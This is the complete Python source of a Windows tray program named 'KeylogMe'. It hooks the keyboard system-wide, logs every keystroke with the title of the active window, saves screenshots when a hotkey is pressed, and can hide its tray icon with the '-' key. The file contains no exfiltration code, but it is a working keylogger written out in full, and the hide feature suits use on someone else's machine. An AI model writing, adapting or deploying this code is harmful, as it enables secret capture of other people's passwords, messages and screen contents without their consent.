# http://www.asciitable.com/

from os.path import join, exists, isfile
from libs.systray import systray
from PIL import ImageGrab
from time import strftime
from sys import exit
import ConfigParser
config = ConfigParser.ConfigParser()
config.read('config.cfg')

# Config
tooltip = config.getboolean('Settings', 'tooltip')
systray_App_title = config.get('Settings', 'systray_App_title')
systray_App_body = config.get('Settings', 'systray_App_body')
default_icon = config.get('Settings', 'default_icon')
icon_2 = config.get('Settings', 'icon_2')
icon_3 = config.get('Settings', 'icon_3')
Dir_icons = config.get('Settings', 'Dir_icons')
Dir_images = config.get('Settings', 'Dir_images')
Dir_logs = config.get('Settings', 'Dir_logs')
LogFile = config.get('Settings', 'LogFile')
Default_icon = Dir_icons + default_icon
Logs_file = Dir_logs + LogFile
if not exists(Dir_icons) or not exists(Dir_images) or not exists(Dir_logs):
    exit(1)
#############################################################################################

# KeyLog
def Keylog_Start(s):
    import pythoncom, pyHook

    def ForgroundWindow():
        from win32gui import GetWindowText, GetForegroundWindow
        ForgroundWindow = GetWindowText (GetForegroundWindow())
        count = len(ForgroundWindow)
        lines = '-' * count + '----'
        Format = '\n' + lines + '\n\n| ' + ForgroundWindow + ' |\n\n' + lines + '\n'
        return Format

    f=open('logs/dump.txt', 'a')
    f.write('Start Keylog...\n')
    f.close()

    def OnKeyboardEvent(event):
        if event.Ascii==27:
            f=open(Logs_file, 'a')
            f.write('\t[Escape]\n')
            f.write('Closing Keylog...\n')
            f.close()
            exit(1)

        if event.Ascii != 0:
            f=open(Logs_file, 'a')
            keylogs=chr(event.Ascii)
            if event.Ascii==13:
                keylogs='[ENTER]\n'
            elif event.Ascii==8:
                keylogs='[BACKSPACE]'
            elif event.Ascii==96 or event.Ascii==126:
                Screenshot(s)
                keylogs='\n' + ForgroundWindow() + ' [SCREENSHOT] ' + strftime('%m/%d/%Y %H:%M:%S') + '\n'
            elif event.Ascii==45:
                s.hide()
            elif event.Ascii==43:
                s.show()
            f.write(keylogs)
            f.close()

    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

Keylog_Menu = systray.Menu(title="Keylog", name="Keylog_Menu")
menuitem_Keylog_Start = systray.MenuItem(title="Start", name="menuitem_Keylog_Start")
Keylog_Menu.add_menuitem(menuitem_Keylog_Start)
menuitem_Keylog_Start.onclick = Keylog_Start

def CheckLogFile(s):
    from Tkinter import Tk, Text, END, LEFT, Frame
    from ttk import Button
    root = Tk()
    text = Text(root)
    def SaveLogFile():
        f=open(Logs_file, 'w')
        f.write(text.get('1.0', END))
        f.close()
        root.destroy()
    f=open(Logs_file, 'r')
    text.insert(END, f.read())
    text.pack()
    f.close()
    frame = Frame(root)
    frame.pack()
    button1 = Button(frame, text='Save', command=SaveLogFile)
    button1.pack(side=LEFT, padx=20, pady=10)
    button2 = Button(frame, text='Close', command=root.destroy)
    button2.pack(side=LEFT, padx=20, pady=10)
    root.mainloop()
menuitem_CheckLogFile = systray.MenuItem(title="Open Logs", name="CheckLogFile")
Keylog_Menu.add_menuitem(menuitem_CheckLogFile)
menuitem_CheckLogFile.onclick = CheckLogFile
#############################################################################################

# Screenshot
def Screenshot(s):
    img=ImageGrab.grab()
    saveas=join(strftime('%m-%d-%Y-%H-%M-%S')+'.png')
    img.save(Dir_images + saveas)

Screenshot_Menu = systray.Menu(title="Screenshot", name="Screenshot_Menu")
menuitem_Screenshot = systray.MenuItem(title="Take", name="menuitem_Screenshot")
Screenshot_Menu.add_menuitem(menuitem_Screenshot)
menuitem_Screenshot.onclick = Screenshot
#############################################################################################

# Help Menu
def Help(s):
    from Tkinter import Tk, Label, W
    from ttk import Button
    root = Tk()
    Label(root, text='Press [ ` ] or [ ~ ] to take a screenshot').grid(sticky=W)
    Label(root, text='Press [ - ] to hide the system tray').grid(sticky=W)
    Label(root, text='Press [ + ] to show the system tray').grid(sticky=W)
    Label(root, text='Press [ ESC ] to quit').grid(sticky=W)
    Label(root, text='').grid(sticky=W)
    Label(root, text='Note: Keylog only close with [ESC]').grid(sticky=W)
    Button(root, text='Close', command=root.destroy).grid(pady=5)
    root.mainloop()

Help_Menu = systray.Menu(title="Help", name="Help_Menu")
menuitem_Help = systray.MenuItem(title="Help", name="menuitem_Help")
Help_Menu.add_menuitem(menuitem_Help)
menuitem_Help.onclick = Help
#############################################################################################

# Change Icon
def DefaultIcon(s):
    s.icon = Dir_icons + default_icon

def Icon2(s):
    s.icon = Dir_icons + icon_2

def Icon3(s):
    s.icon = Dir_icons + icon_3
    
ChangeIcon_Menu = systray.Menu(title="Change Icon", name="ChangeIcon")

menuitem_Default_icon = systray.MenuItem(title='Default', name="menuitem_Default_icon")
ChangeIcon_Menu.add_menuitem(menuitem_Default_icon)
menuitem_Default_icon.onclick = DefaultIcon

menuitem_Icon2 = systray.MenuItem(title='Icon 2', name="menuitem_Icon2")
ChangeIcon_Menu.add_menuitem(menuitem_Icon2)
menuitem_Icon2.onclick = Icon2

menuitem_Icon3 = systray.MenuItem(title='Icon 3', name="menuitem_Icon3")
ChangeIcon_Menu.add_menuitem(menuitem_Icon3)
menuitem_Icon3.onclick = Icon3
#############################################################################################

# Settings
def Settings(s):
    from ConfigParser import ConfigParser, RawConfigParser
    config = ConfigParser()
    config.read('config.cfg')
    tooltip = config.getboolean('Settings', 'tooltip')
    systray_App_title = config.get('Settings', 'systray_App_title')
    systray_App_body = config.get('Settings', 'systray_App_body')
    from Tkinter import Tk, Label, W, Entry, Frame, IntVar, END
    from ttk import Button, Radiobutton
    root = Tk()
    
    def SaveSettings():
        import ConfigParser
        Writeconfig = RawConfigParser()
        Writeconfig.read('config.cfg')
        if v.get() == 1:
            tooltip_V = 'True'
        else: tooltip_V = 'False'
        Writeconfig.set('Settings', 'tooltip', tooltip_V)
        Writeconfig.set('Settings', 'systray_app_title', entry1.get())
        Writeconfig.set('Settings', 'systray_app_body', entry2.get())
        with open('config.cfg', 'w+') as configfile:
            Writeconfig.write(configfile)
        root.destroy()
        
    Label(root, text='Enable - Disable Tooltip').grid(sticky=W)
    frame1 = Frame(root)
    frame1.grid()
    v = IntVar()
    if tooltip == True:
        v.set('1')
    else: v.set('2')
    Radiobutton(frame1, text='True', variable=v, value=1).grid(row=0, column=0, padx=5)
    Radiobutton(frame1, text='False', variable=v, value=2).grid(row=0, column=1, padx=5)
    Label(root, text='Set the Tooltip Text Title').grid(sticky=W, pady=5)
    entry1 = Entry(root)
    entry1.insert(END, systray_App_title)
    entry1.grid(pady=5)
    Label(root,text='Set the Tooltip Text Body').grid(sticky=W, pady=5)
    entry2 = Entry(root)
    entry2.insert(END, systray_App_body)
    entry2.grid(pady=5)
    frame2 = Frame(root)
    frame2.grid()
    Button(frame2, text='Save', command=SaveSettings).grid(row=0, column=0, pady=10, padx=5)
    Button(frame2, text='Close', command=root.destroy).grid(row=0, column=1, pady=10, padx=5)
    root.mainloop()

Settings_Menu = systray.Menu(title="Settings", name="Settings_Menu")
menuitem_Settings = systray.MenuItem(title="Edit", name="menuitem_Settings")
Settings_Menu.add_menuitem(menuitem_Settings)
menuitem_Settings.onclick = Settings
#############################################################################################

KeylogMe_App = systray.App(systray_App_title, Default_icon)

def onload(s):
    s.show_tooltip(systray_App_title, systray_App_body)
if tooltip == True:
    KeylogMe_App.on_load = onload
else: pass

KeylogMe_App.add_menu(Keylog_Menu)
KeylogMe_App.add_menu(Screenshot_Menu)
KeylogMe_App.add_menu(ChangeIcon_Menu)
KeylogMe_App.add_menu(Settings_Menu)
KeylogMe_App.add_menu(Help_Menu)
KeylogMe_App.start()
